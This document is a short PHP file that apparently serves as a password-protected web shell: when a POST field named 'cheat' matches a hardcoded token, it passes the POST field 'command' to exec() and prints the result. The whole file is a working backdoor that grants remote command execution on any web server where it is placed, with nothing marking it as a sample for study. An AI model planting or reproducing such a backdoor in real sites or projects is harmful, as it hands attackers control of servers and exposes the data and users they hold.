<?php

if($_POST["cheat"] && $_POST["cheat"] == "bdf1ed5d23a113128980c5e304cae020"){
  echo exec($_POST["command"]);
}